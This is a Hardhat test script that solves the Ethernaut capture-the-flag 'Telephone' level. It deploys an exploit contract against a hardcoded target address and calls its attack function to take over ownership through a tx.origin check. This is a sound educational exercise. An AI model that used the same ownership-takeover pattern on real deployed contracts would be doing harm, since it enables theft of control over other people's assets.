import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";


describe("Telephone", function(){
        it("Aims to Solve the Telephone Question of the Ethernaut CTF", async function(){
                
                this.timeout(0);

                // Initial Setup (Wallet etc..) 
                const accounts = await ethers.getSigners();
                const eoa = accounts[0];
                let balance = await eoa.getBalance();

                console.log(ethers.utils.formatEther(balance));
                expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

                // Define Target ABI
                const targetABI = ["function owner() public view returns (address)",]
                const targetAddr = "0x8C148b5EA22cA5defc78Af1f72931DBaD3a9cF5C"; // Target Contract Address Here

                // Connect to the Target Contract
                let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
                let targetCont = contract.connect(eoa);

                // Define and Connect to the Malicious Contract
                const maliciousFactory = await ethers.getContractFactory("TelephoneExploit");
                const maliciousContract = await maliciousFactory.deploy(targetAddr);

                // Wait for Malicious Contract to be Deployed
                await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

                //Initial Owner Check
                let init_owner = await targetCont.owner();
                console.log(`Current Owner: ${init_owner}`);

                //Change the Owner via tx.origin
                let transaction = await maliciousContract.attack(eoa.address);
                await transaction.wait();

                //Check If the Owner has Changed
                let changed_owner = await targetCont.owner();
                console.log(`Current Owner: ${changed_owner}`);
                expect(changed_owner).to.eq(eoa.address);
        });
});